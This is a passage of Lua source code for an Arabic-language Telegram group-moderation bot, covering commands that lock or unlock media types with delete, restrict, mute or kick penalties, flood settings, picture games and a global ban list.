elseif text == 'قفل الاغاني بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الاغاني بالكتم ')
end,nil)   
elseif text == 'قفل الاغاني بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Audio"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الاغاني بالطرد ')
end,nil)   
elseif text == 'فتح الاغاني' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Audio"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الاغاني ')
end,nil)   
end
if text == 'قفل الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الصوت ')
end,nil)   
elseif text == 'قفل الصوت بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الصوت بالتقييد ')
end,nil)   
elseif text == 'قفل الصوت بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الصوت بالكتم ')
end,nil)   
elseif text == 'قفل الصوت بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:vico"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الصوت بالطرد ')
end,nil)   
elseif text == 'فتح الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:vico"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الصوت ')
end,nil)   
end
if text == 'قفل الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الكيبورد ')
end,nil)   
elseif text == 'قفل الكيبورد بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الكيبورد بالتقييد ')
end,nil)   
elseif text == 'قفل الكيبورد بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الكيبورد بالكتم ')  
end,nil)   
elseif text == 'قفل الكيبورد بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الكيبورد بالطرد ')  
end,nil)   
elseif text == 'فتح الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Keyboard"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الكيبورد ')  
end,nil)   
end
if text == 'قفل الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الملصقات ')  
end,nil)   
elseif text == 'قفل الملصقات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الملصقات بالتقييد ')  
end,nil)
elseif text == 'قفل الملصقات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الملصقات بالكتم ')  
end,nil)   
elseif text == 'قفل الملصقات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الملصقات بالطرد ')  
end,nil)   
elseif text == 'فتح الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الملصقات ')  
end,nil)   
end
if text == 'قفل التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التوجيه ')  
end,nil)   
elseif text == 'قفل التوجيه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التوجيه بالتقييد ')  
end,nil)
elseif text == 'قفل التوجيه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التوجيه بالكتم ')  
end,nil)   
elseif text == 'قفل التوجيه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التوجيه بالطرد ')  
end,nil)   
elseif text == 'فتح التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:forward"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح التوجيه ')  
end,nil)   
end
if text == 'قفل الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الملفات ')  
end,nil)   
elseif text == 'قفل الملفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الملفات بالتقييد ')  
end,nil)
elseif text == 'قفل الملفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الملفات بالكتم ')  
end,nil)   
elseif text == 'قفل الملفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الملفات بالطرد ')  
end,nil)   
elseif text == 'فتح الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Document"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الملفات ')  
end,nil)   
end
if text == 'قفل السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل السيلفي ')  
end,nil)   
elseif text == 'قفل السيلفي بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل السيلفي بالتقييد ')  
end,nil)
elseif text == 'قفل السيلفي بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل السيلفي بالكتم ')  
end,nil)   
elseif text == 'قفل السيلفي بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل السيلفي بالطرد ')  
end,nil)   
elseif text == 'فتح السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Unsupported"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح السيلفي ')  
end,nil)   
end
if text == 'قفل الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الماركداون ')  
end,nil)   
elseif text == 'قفل الماركداون بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الماركداون بالتقييد ')  
end,nil)
elseif text == 'قفل الماركداون بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الماركداون بالكتم ')  
end,nil)   
elseif text == 'قفل الماركداون بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الماركداون بالطرد ')  
end,nil)   
elseif text == 'فتح الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Markdaun"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الماركداون ')  
end,nil)   
end
if text == 'قفل الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الجهات ')  
end,nil)   
elseif text == 'قفل الجهات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الجهات بالتقييد ')  
end,nil)
elseif text == 'قفل الجهات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الجهات بالكتم ')  
end,nil)   
elseif text == 'قفل الجهات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الجهات بالطرد ')  
end,nil)   
elseif text == 'فتح الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Contact"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الجهات ')  
end,nil)   
end
if text == 'قفل الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الكلايش ')  
end,nil)   
elseif text == 'قفل الكلايش بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الكلايش بالتقييد ')  
end,nil)
elseif text == 'قفل الكلايش بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الكلايش بالكتم ')  
end,nil)   
elseif text == 'قفل الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الكلايش بالطرد ')  
end,nil)   
elseif text == 'فتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الكلايش ')  
end,nil)   
end
if text == 'قفل التكرار بالطرد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
send(msg.chat_id_, msg.id_,' ◉ تم قفل التكرار بالطرد')
elseif text == 'قفل التكرار' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,' ◉ تم قفل التكرار')
elseif text == 'قفل التكرار بالتقييد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,' ◉ تم قفل التكرار بالتقييد')
elseif text == 'قفل التكرار بالكتم' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,' ◉ تم قفل التكرار بالكتم')
elseif text == 'فتح التكرار' and Mod(msg) then 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,' ◉ تم فتح التكرار')
end

if text == "تويت بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,28); 
local Text ='مرحبا إليك تويت بالصور◉'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/wffhvv/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "لو خيروك بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,24); 
local Text ='مرحبا اليك لو خيروك بالصوره◉'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/bebo44y/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "حروف بالصور" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,15); 
local Text ='مرحبا إليك حروف بالصوره◉'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ffadi8/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end


if text == 'تفعيل الحمايه' and Mod(msg) and msg.reply_to_message_id_ == 0 then  
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')   
database:set(bot_id..'Bot:Id:Photo'..msg.chat_id_,true)  
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')   
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')   
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')   
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')   
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')   
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')   
database:set(bot_id..'lock:Fars'..msg.chat_id_,true)  
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true)  
database:set(bot_id..'lock:edit'..msg.chat_id_,true)  
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'\n◉تم قفل البوتات بالطرد\n◉تم وضع الايدي بدون صوره\n◉تم قفل التكرار بالطرد\n◉تم قفل الروابط\n◉تم قفل التوجيه\n◉تم قفل الملصقات\n◉تم قفل المتحركه\n◉تم قفل الفيديو\n◉تم قفل السب\n◉تم قفل التعديل\n◉تم قفل الفارسيه\n◉تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه ←['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..')')   
end,nil) 
end
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and DevSoFi(msg) then    
dofile('DRAGON.lua')  
send(msg.chat_id_, msg.id_, ' ◉ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevSoFi(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه العام')
return false
end
if text == ("مسح الحظر العام") and DevSoFi(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه العام')
return false
end
if text == ("قائمه العام") and DevSoFi(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n ◉ قائمة المحظورين عام \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد محظورين عام"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("حظر عام") and msg.reply_to_message_id_ and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1208165035) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(50) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مطور السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber( 1744308503) then  
